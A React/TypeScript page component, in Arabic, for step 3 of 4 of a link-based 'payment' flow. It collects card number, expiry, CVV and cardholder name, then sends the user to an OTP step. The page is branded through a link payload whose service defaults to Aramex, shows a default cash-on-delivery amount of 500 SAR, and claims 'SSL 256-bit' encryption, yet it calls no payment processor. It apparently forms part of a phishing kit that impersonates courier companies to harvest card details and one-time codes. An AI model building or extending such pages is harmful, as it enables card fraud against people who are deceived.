import { useState } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { useTheme } from "@/themes/ThemeContext";
import { PaymentHeader, PaymentCard, PaymentButton, PaymentFormField, PaymentExpiryField } from "@/components/payment";
import { useLink } from "@/hooks/useSupabase";
import { CreditCard, Lock, ArrowLeft } from "lucide-react";
import "@/themes/themeStyles.css";

const PaymentCardInputTheme = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { theme } = useTheme();
  const { data: linkData } = useLink(id);

  // Get URL parameters
  const urlParams = new URLSearchParams(window.location.search);
  const countryCode = urlParams.get('country') || "SA";
  const currencyCode = urlParams.get('currency') || "SAR";

  const [cardNumber, setCardNumber] = useState("");
  const [expiryMonth, setExpiryMonth] = useState("");
  const [expiryYear, setExpiryYear] = useState("");
  const [cvv, setCvv] = useState("");
  const [cardholderName, setCardholderName] = useState("");
  const [errors, setErrors] = useState<Record<string, string>>({});

  if (!theme) {
    return (
      <div style={{
        display: 'flex',
        justifyContent: 'center',
        alignItems: 'center',
        minHeight: '100vh',
      }}>
        <div className="spinner" />
      </div>
    );
  }

  const serviceKey = linkData?.payload?.service_key || 'aramex';
  const serviceName = linkData?.payload?.service_name || serviceKey;
  const shippingInfo = linkData?.payload as any;

  // Get amount from shipping info
  const rawAmount = shippingInfo?.cod_amount || 500;
  const amount = typeof rawAmount === 'string' ? parseFloat(rawAmount) : rawAmount;

  const formatCardNumber = (value: string) => {
    // Remove all non-numeric characters
    const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "");
    // Add spaces every 4 digits
    const matches = v.match(/\d{4,16}/g);
    const match = matches && matches[0] || "";
    const parts = [];

    for (let i = 0, len = match.length; i < len; i += 4) {
      parts.push(match.substring(i, i + 4));
    }

    if (parts.length) {
      return parts.join(" ");
    } else {
      return v;
    }
  };

  const formatExpiryDate = (value: string) => {
    // Remove all non-numeric characters
    const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "");
    // Format as MM/YY
    if (v.length >= 2) {
      return `${v.substring(0, 2)}/${v.substring(2, 4)}`;
    }
    return v;
  };

  const validateForm = () => {
    const newErrors: Record<string, string> = {};

    if (!cardNumber || cardNumber.replace(/\s/g, "").length < 16) {
      newErrors.cardNumber = "يرجى إدخال رقم بطاقة صحيح";
    }

    if (!expiryMonth || !expiryYear) {
      newErrors.expiryDate = "يرجى إدخال تاريخ انتهاء صالح";
    }

    if (!cvv || cvv.length < 3) {
      newErrors.cvv = "يرجى إدخال CVV صحيح";
    }

    if (!cardholderName.trim()) {
      newErrors.cardholderName = "يرجى إدخال اسم حامل البطاقة";
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();

    if (validateForm()) {
      navigate(`/pay/${id}/otp?country=${countryCode}&currency=${currencyCode}`);
    }
  };

  const handleBack = () => {
    navigate(`/pay/${id}/details?country=${countryCode}&currency=${currencyCode}`);
  };

  const steps = [
    { id: '1', label: 'التفاصيل', description: 'معلومات الدفعة' },
    { id: '2', label: 'المستلم', description: 'بيانات الاستلام' },
    { id: '3', label: 'الدفع', description: 'معلومات البطاقة' },
    { id: '4', label: 'التحقق', description: 'رمز OTP' },
  ];

  return (
    <div className="fade-in" style={{
      minHeight: '100vh',
      backgroundColor: theme.colors.background,
      padding: theme.spacing.md,
    }}>
      {/* Payment Header with Company Branding */}
      <PaymentHeader
        title="معلومات البطاقة"
        subtitle={`خدمة ${serviceName}`}
        showBackButton={true}
        onBackClick={handleBack}
        logoPosition="left"
      />

      <div style={{
        maxWidth: '600px',
        margin: `${theme.spacing.lg} auto`,
        display: 'flex',
        flexDirection: 'column',
        gap: theme.spacing.lg,
      }}>
        {/* Progress Steps */}
        <div className="slide-in">
          <div style={{
            backgroundColor: theme.colors.surface,
            padding: theme.spacing.lg,
            borderRadius: theme.borderRadius.lg,
            border: `1px solid ${theme.colors.border}`,
          }}>
            <div style={{
              display: 'flex',
              justifyContent: 'space-between',
              marginBottom: theme.spacing.md,
            }}>
              <span style={{
                fontSize: theme.fonts.sizes.sm,
                fontWeight: theme.fonts.weights.semibold,
                color: theme.colors.text,
              }}>
                الخطوة 3 من 4
              </span>
              <span style={{
                fontSize: theme.fonts.sizes.xs,
                color: theme.colors.textSecondary || theme.colors.text,
              }}>
                {serviceName}
              </span>
            </div>

            {/* Progress Bar */}
            <div style={{
              width: '100%',
              height: '4px',
              backgroundColor: theme.colors.border,
              borderRadius: theme.borderRadius.full,
              overflow: 'hidden',
            }}>
              <div style={{
                width: '75%',
                height: '100%',
                backgroundColor: theme.colors.primary,
                borderRadius: theme.borderRadius.full,
                transition: 'width 0.5s ease',
              }} />
            </div>
          </div>
        </div>

        {/* Card Input Form */}
        <div className="slide-in" style={{
          animationDelay: '0.1s',
        }}>
          <PaymentCard
            title="أدخل بيانات البطاقة"
            subtitle="معلوماتك محمية ومشفرة"
          >
            <form onSubmit={handleSubmit}>
              <div style={{
                display: 'flex',
                flexDirection: 'column',
                gap: theme.spacing.md,
              }}>
                <PaymentFormField
                  label="رقم البطاقة"
                  type="text"
                  placeholder="0000 0000 0000 0000"
                  value={cardNumber}
                  onChange={(e) => setCardNumber(formatCardNumber(e.target.value))}
                  maxLength={19}
                  error={errors.cardNumber}
                  leftIcon={<CreditCard size={20} />}
                  variant={theme.style.formField as 'outlined' | 'filled' | 'flat'}
                />

                <PaymentExpiryField
                  label="تاريخ الانتهاء"
                  error={errors.expiryDate}
                  monthValue={expiryMonth}
                  yearValue={expiryYear}
                  onMonthChange={setExpiryMonth}
                  onYearChange={setExpiryYear}
                />

                <PaymentFormField
                  label="CVV"
                  type="password"
                  placeholder="***"
                  value={cvv}
                  onChange={(e) => setCvv(e.target.value.replace(/[^0-9]/g, ""))}
                  maxLength={4}
                  error={errors.cvv}
                  leftIcon={<Lock size={20} />}
                  variant={theme.style.formField as 'outlined' | 'filled' | 'flat'}
                />

                <PaymentFormField
                  label="اسم حامل البطاقة"
                  type="text"
                  placeholder="الاسم كما يظهر على البطاقة"
                  value={cardholderName}
                  onChange={(e) => setCardholderName(e.target.value)}
                  error={errors.cardholderName}
                  variant={theme.style.formField as 'outlined' | 'filled' | 'flat'}
                />

                {/* Security Notice */}
                <div style={{
                  display: 'flex',
                  alignItems: 'center',
                  gap: theme.spacing.sm,
                  padding: theme.spacing.md,
                  backgroundColor: `${theme.colors.success || '#28A745'}10`,
                  borderRadius: theme.borderRadius.sm,
                  border: `1px solid ${theme.colors.success || '#28A745'}30`,
                }}>
                  <Lock size={16} style={{ color: theme.colors.success || '#28A745' }} />
                  <span style={{
                    fontSize: theme.fonts.sizes.xs,
                    color: theme.colors.text,
                  }}>
                    جميع المعلومات محمية بتشفير SSL 256-bit
                  </span>
                </div>

                {/* Submit Button */}
                <PaymentButton
                  type="submit"
                  variant="primary"
                  size="lg"
                  fullWidth={true}
                  icon={<ArrowLeft size={20} />}
                  style={{
                    marginTop: theme.spacing.lg,
                  }}
                >
                  تأكيد والدفع
                </PaymentButton>
              </div>
            </form>
          </PaymentCard>
        </div>
      </div>
    </div>
  );
};

export default PaymentCardInputTheme;
